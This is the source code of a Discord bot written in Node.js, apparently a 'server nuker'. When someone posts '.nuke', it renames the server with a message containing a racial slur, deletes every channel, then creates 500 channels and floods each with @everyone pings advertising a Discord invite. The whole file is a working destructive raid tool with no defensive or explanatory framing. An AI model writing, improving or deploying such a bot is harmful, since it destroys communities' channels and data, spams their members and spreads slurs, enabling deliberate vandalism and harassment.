const { Client, GatewayIntentBits } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildChannels
    ]
});

const TOKEN = process.env.TOKEN;

http.createServer((req, res) => {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => {
    console.log(`[+] ${client.user.tag} is ready`);
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.content !== '.nuke') return;

    message.delete().catch(() => {});
    const g = message.guild;

    g.setName('NGA GOT NUKED BY JHUB').catch(() => {});

    const channels = Array.from(g.channels.cache.values());
    for (const ch of channels) {
        ch.delete().catch(() => {});
        await sleep(100);
    }

    for (let i = 0; i < 500; i++) {
        g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
            if (!ch) return;
            for (let j = 0; j < 10; j++) {
                ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
            }
        }).catch(() => {});
        await sleep(200);
    }
});

client.login(TOKEN);
